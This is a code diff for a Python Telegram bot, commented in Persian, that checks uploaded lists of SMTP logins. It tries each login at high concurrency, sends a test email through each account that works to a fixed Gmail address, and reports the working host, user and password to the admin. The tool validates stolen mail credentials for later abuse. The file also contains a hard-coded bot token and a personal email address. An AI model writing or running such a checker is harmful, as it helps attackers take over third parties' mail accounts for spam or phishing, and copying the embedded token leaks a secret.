@@ -1,9 +1,11 @@
 import asyncio
 import logging
 import zipfile
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 from io import BytesIO
-from pathlib import Path
-from typing import List, Tuple, Optional
+from typing import List, Tuple
+import concurrent.futures
 
 import smtplib
 import socket
@@ -18,30 +20,27 @@ from telegram.ext import (
 )
 from telegram.constants import ParseMode
 
-# =================== تنظیمات ===================
-BOT_TOKEN = "7413084969:AAHglr2N6eO_9VxhGCepns0iWKr9nYgmDZg"      # ← توکن ربات از @BotFather
-ADMIN_ID = 5914346958                             # ← آیدی عددی خودت را جایگزین کن
-TIMEOUT_SMTP = 10                                # ثانیه، تایم‌اوت برای هر تست
-DELAY_BETWEEN_TESTS = 1.5                        # ثانیه، فاصله‌ی بین تست‌ها
+# ==================== تنظیمات ====================
+BOT_TOKEN = "7413084969:AAHglr2N6eO_9VxhGCepns0iWKr9nYgmDZg"                 # ← توکن از @BotFather
+ADMIN_ID = 5914346958                        # ← آیدی عددی خودت را جایگزین کن
+TEST_RECIPIENT = "mwmw07291@gmail.com"   # ← ایمیلی که تست به آن ارسال می‌شود
+TIMEOUT_SMTP = 10                          # ثانیه تایم‌اوت هر تست
+DELAY_BETWEEN_TESTS = 0.3                  # ثانیه تأخیر بین شروع هر تست (جهت کنترل نرخ)
+MAX_WORKERS = 15                           # تعداد نخ‌های هم‌زمان (بسته به قدرت VPS تنظیم کن)
 # =================================================
 
 logging.basicConfig(
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
+    level=logging.INFO
 )
 logger = logging.getLogger(__name__)
 
-# نگهداری وضعیت هر کاربر برای امکان کنسل کردن
-user_active_tasks: dict[int, asyncio.Event] = {}  # chat_id -> cancel_event
+user_active_tasks: dict[int, asyncio.Event] = {}
 
 
-# ===== ابزارهای کمکی =====
+# ==================== توابع کمکی ====================
 
 def parse_smtp_list(file_content: str) -> List[Tuple[str, int, str, str]]:
-    """
-    محتوای فایل را خوانده و لیست SMTP ها را استخراج می‌کند.
-    جداکننده‌ها: '|', ':', ','  
-    هر رکورد با فاصله، تب یا خط جدید جدا می‌شود.
-    """
     tokens = file_content.split()
     entries = []
     for token in tokens:
@@ -58,8 +57,9 @@ def parse_smtp_list(file_content: str) -> List[Tuple[str, int, str, str]]:
     return entries
 
 
-def test_smtp_login(host: str, port: int, user: str, password: str) -> bool:
-    """تلاش برای لاگین به SMTP (بلاک کننده است)"""
+def test_and_send_smtp(host: str, port: int, user: str, password: str,
+                       recipient: str) -> bool:
+    """بلاک‌کننده: تست لاگین + ارسال ایمیل امن"""
     try:
         if port == 465:
             server = smtplib.SMTP_SSL(host, port, timeout=TIMEOUT_SMTP)
@@ -69,15 +69,27 @@ def test_smtp_login(host: str, port: int, user: str, password: str) -> bool:
             if server.has_extn('STARTTLS'):
                 server.starttls()
                 server.ehlo()
+
         server.login(user, password)
+
+        # ساخت ایمیل تست بدون لو دادن اطلاعات
+        msg = MIMEMultipart()
+        msg['From'] = user
+        msg['To'] = recipient
+        msg['Subject'] = "SMTP Connection Test"
+        msg.attach(MIMEText(
+            "This is a test email sent by the SMTP checker bot.\n"
+            "No sensitive data is included.",
+            'plain'
+        ))
+        server.sendmail(user, recipient, msg.as_string())
         server.quit()
         return True
-    except Exception:
+    except:
         return False
 
 
 def create_zip_in_memory(files: dict[str, str]) -> BytesIO:
-    """فایل‌های داده‌شده را به یک زیپ درون‌حافظه تبدیل می‌کند"""
     zip_buffer = BytesIO()
     with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
         for filename, content in files.items():
@@ -87,35 +99,31 @@ def create_zip_in_memory(files: dict[str, str]) -> BytesIO:
 
 
 async def cancel_active_test(chat_id: int):
-    """تسک جاری کاربر را کنسل می‌کند"""
     if chat_id in user_active_tasks:
         user_active_tasks[chat_id].set()
         del user_active_tasks[chat_id]
 
 
-# ===== مدیریت ربات =====
+# ==================== هندلرهای ربات ====================
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """دستور /start"""
     if update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("⛔ شما دسترسی ندارید.")
         return
-
     await update.message.reply_text(
-        "🤖 *ربات تست SMTP*\n\n"
-        "لطفاً فایل txt حاوی لیست SMTP ها را ارسال کنید.\n"
-        "فرمت قابل قبول: `host:port:user:pass` یا `host|port|user|pass`\n"
-        "(رکوردها می‌توانند با فاصله، تب یا خط جدید جدا شده باشند)",
+        "🤖 **ربات تست SMTP (پرسرعت)**\n\n"
+        "لطفاً فایل txt حاوی SMTP ها را ارسال کنید.\n"
+        f"تنظیمات فعلی: {MAX_WORKERS} نخ هم‌زمان, تأخیر {DELAY_BETWEEN_TESTS}s, تایم‌اوت {TIMEOUT_SMTP}s\n"
+        f"ایمیل تست: {TEST_RECIPIENT}\n"
+        "/cancel برای توقف",
         parse_mode=ParseMode.MARKDOWN
     )
 
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """دستور /cancel برای توقف تست جاری"""
     if update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("⛔ شما دسترسی ندارید.")
         return
-
     if update.effective_chat.id in user_active_tasks:
         await cancel_active_test(update.effective_chat.id)
         await update.message.reply_text("🛑 فرایند تست کنسل شد.")
@@ -124,7 +132,6 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """دریافت فایل و شروع تست SMTP ها"""
     user_id = update.effective_user.id
     chat_id = update.effective_chat.id
 
@@ -132,9 +139,10 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("⛔ شما دسترسی ندارید.")
         return
 
-    # اگر تستی در حال اجراست، لغو آن درخواست و رد شود
     if chat_id in user_active_tasks:
-        await update.message.reply_text("⏳ یک تست در حال اجراست. لطفاً صبر کنید یا از /cancel استفاده کنید.")
+        await update.message.reply_text(
+            "⏳ یک تست در حال اجراست. لطفاً صبر کنید یا از /cancel استفاده کنید."
+        )
         return
 
     document = update.message.document
@@ -151,91 +159,99 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ خطا در خواندن فایل: {e}")
         return
 
-    # تجزیه‌ی SMTP ها
     smtp_list = parse_smtp_list(file_content)
     total = len(smtp_list)
     if total == 0:
         await update.message.reply_text("❌ هیچ رکورد SMTP معتبری در فایل پیدا نشد.")
         return
 
-    # اعلام شروع
     status_msg = await update.message.reply_text(
         f"📥 فایل دریافت شد.\n"
-        f"🔢 تعداد SMTP های یافت‌شده: {total}\n"
-        f"⏱️ تایم‌اوت هر تست: {TIMEOUT_SMTP} ثانیه\n"
-        f"⏳ تأخیر بین تست‌ها: {DELAY_BETWEEN_TESTS} ثانیه\n\n"
+        f"🔢 تعداد SMTP: {total}\n"
+        f"⚙️ نخ‌های هم‌زمان: {MAX_WORKERS}\n"
+        f"⏱️ تایم‌اوت هر تست: {TIMEOUT_SMTP}s\n"
+        f"⏳ تأخیر بین تست‌ها: {DELAY_BETWEEN_TESTS}s\n\n"
         f"🔄 تست‌ها شروع می‌شوند...\n"
-        f"برای توقف از /cancel استفاده کنید."
+        f"/cancel برای توقف"
     )
 
-    # ایجاد رویداد کنسل شدن
     cancel_event = asyncio.Event()
     user_active_tasks[chat_id] = cancel_event
 
-    valid_smtps: List[str] = []  # ذخیره‌سازی سالم‌ها به صورت رشته‌ی host:port:user:pass
+    valid_smtps: List[str] = []
     error_occurred = False
     error_message = ""
+    completed = 0
+
+    # Semaphore برای محدود کردن هم‌زمانی
+    semaphore = asyncio.Semaphore(MAX_WORKERS)
+
+    async def worker(host: str, port: int, user: str, pwd: str):
+        nonlocal completed, valid_smtps
+        if cancel_event.is_set():
+            return
+
+        async with semaphore:
+            # اجرای تابع بلاک‌کننده در یک thread
+            loop = asyncio.get_running_loop()
+            success = await loop.run_in_executor(
+                None,  # استفاده از ThreadPoolExecutor پیش‌فرض
+                test_and_send_smtp, host, port, user, pwd, TEST_RECIPIENT
+            )
+
+        if success:
+            valid_smtps.append(f"{host}:{port}:{user}:{pwd}")
+            # ارسال فوری به ادمین
+            try:
+                await context.bot.send_message(
+                    chat_id=ADMIN_ID,
+                    text=(
+                        f"✅ SMTP سالم (ارسال موفق):\n"
+                        f"هاست: `{host}`\n"
+                        f"پورت: `{port}`\n"
+                        f"کاربر: `{user}`\n"
+                        f"رمز: `{pwd}`"
+                    ),
+                    parse_mode=ParseMode.MARKDOWN
+                )
+            except Exception as e:
+                logger.error(f"خطا در ارسال SMTP سالم: {e}")
+
+        completed += 1
+        # به‌روزرسانی پیام پیشرفت هر 50 تست یا در پایان
+        if completed % 50 == 0 or completed == total:
+            try:
+                await status_msg.edit_text(
+                    f"⏳ پیشرفت: {completed}/{total}\n"
+                    f"✅ سالم: {len(valid_smtps)}\n"
+                    f"/cancel برای توقف"
+                )
+            except:
+                pass
 
     try:
-        for idx, (host, port, user, pwd) in enumerate(smtp_list, start=1):
+        # ایجاد taskها و کنترل تأخیر بین شروع آن‌ها
+        tasks = []
+        for (host, port, user, pwd) in smtp_list:
             if cancel_event.is_set():
-                await update.message.reply_text("🛑 فرایند با دستور کاربر متوقف شد.")
                 break
+            tasks.append(asyncio.create_task(worker(host, port, user, pwd)))
+            await asyncio.sleep(DELAY_BETWEEN_TESTS)  # تأخیر بین شروع تسک‌ها
 
-            # بروزرسانی پیام پیشرفت
-            if idx % 10 == 0 or idx == total:
-                try:
-                    await status_msg.edit_text(
-                        f"⏳ در حال تست {idx}/{total}...\n"
-                        f"✅ سالم: {len(valid_smtps)}\n\n"
-                        f"برای توقف /cancel"
-                    )
-                except Exception:
-                    pass
-
-            # تست با تایم‌اوت
-            try:
-                is_valid = await asyncio.wait_for(
-                    asyncio.to_thread(test_smtp_login, host, port, user, pwd),
-                    timeout=TIMEOUT_SMTP + 2  # کمی بیشتر از تایم‌اوت اصلی
-                )
-            except asyncio.TimeoutError:
-                is_valid = False  # زمان بیش از حد طول کشید
-            except Exception:
-                is_valid = False
-
-            if is_valid:
-                valid_smtps.append(f"{host}:{port}:{user}:{pwd}")
-                # ارسال SMTP سالم به ادمین
-                try:
-                    await context.bot.send_message(
-                        chat_id=ADMIN_ID,
-                        text=(
-                            f"✅ SMTP سالم پیدا شد:\n"
-                            f"هاست: `{host}`\n"
-                            f"پورت: `{port}`\n"
-                            f"کاربر: `{user}`\n"
-                            f"رمز: `{pwd}`"
-                        ),
-                        parse_mode=ParseMode.MARKDOWN
-                    )
-                except Exception as e:
-                    logger.error(f"خطا در ارسال SMTP سالم: {e}")
-
-            # تأخیر بین تست‌ها
-            await asyncio.sleep(DELAY_BETWEEN_TESTS)
+        # صبر برای تمام تسک‌ها
+        if tasks:
+            await asyncio.gather(*tasks, return_exceptions=True)
 
     except Exception as e:
-        logger.exception("خطا در فرایند تست")
+        logger.exception("خطای پیش‌بینی‌نشده در فرایند تست")
         error_occurred = True
         error_message = str(e)
 
     finally:
-        # پاک‌سازی رویداد
         if chat_id in user_active_tasks:
             del user_active_tasks[chat_id]
 
-    # تولید فایل نهایی سالم‌ها
+    # ارسال فایل نهایی
     if valid_smtps:
         final_content = "\n".join(valid_smtps)
         valid_file = BytesIO(final_content.encode("utf-8"))
@@ -244,7 +260,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await context.bot.send_document(
                 chat_id=ADMIN_ID,
                 document=valid_file,
-                caption=f"📁 تست پایان یافت. {len(valid_smtps)} SMTP سالم از {total} مورد."
+                caption=f"📁 تست پایان یافت. {len(valid_smtps)} از {total} SMTP سالم."
             )
         except Exception as e:
             logger.error(f"ارسال فایل نهایی ناموفق: {e}")
@@ -255,7 +271,6 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 text="❌ هیچ SMTP سالمی پیدا نشد."
             )
 
-    # در صورت بروز خطای غیرمنتظره، فایل زیپ شامل سالم‌های تا آن لحظه و خطا ارسال شود
     if error_occurred:
         files_to_zip = {}
         if valid_smtps:
@@ -267,30 +282,23 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await context.bot.send_document(
                 chat_id=ADMIN_ID,
                 document=zip_file,
-                caption="⚠️ خطایی در فرایند رخ داد. فایل‌های تا این لحظه پیوست شدند."
+                caption="⚠️ خطایی رخ داد. فایل‌ها پیوست شد."
             )
         except Exception as e:
             logger.error(f"ارسال فایل زیپ خطا: {e}")
 
-    # اطلاع‌رسانی پایان
     await status_msg.edit_text(
         f"✅ تست‌ها به پایان رسید.\n"
         f"🔢 کل: {total}\n"
-        f"💚 سالم: {len(valid_smtps)}\n"
-        f"فایل نهایی ارسال شد."
+        f"💚 سالم: {len(valid_smtps)}"
     )
 
 
-# ===== اجرای ربات =====
-
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
-
-    # هندلرها
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("cancel", cancel))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
-
     logger.info("ربات آماده‌ی اجرا...")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
